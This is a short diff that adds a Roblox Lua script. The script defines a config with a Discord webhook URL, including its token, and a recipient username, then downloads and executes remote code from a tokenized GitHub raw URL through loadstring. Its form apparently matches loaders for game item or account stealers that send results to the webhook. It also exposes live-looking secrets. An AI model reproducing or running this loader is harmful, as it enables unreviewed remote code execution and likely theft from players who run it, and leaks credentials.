@@ -1,0 +1,8 @@
+_G["Script-SM_Config"] = {
+    user_webhook = "https://discord.com/api/webhooks/1480201714148839570/eggO1M4_pdTYnI7Y1kUytiHF0Ycdl8mEdBg0fqlwRLcFV7LC-ewKFmH3-yroS847g8b8",
+    users = {
+        "Abduljammarmm2t"
+    }
+}
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/script-9209/Testm/refs/heads/main/as?token=GHSAT0AAAAAAEIMNG3RL7C6XU4EID23KHE62VKQGUA'))()
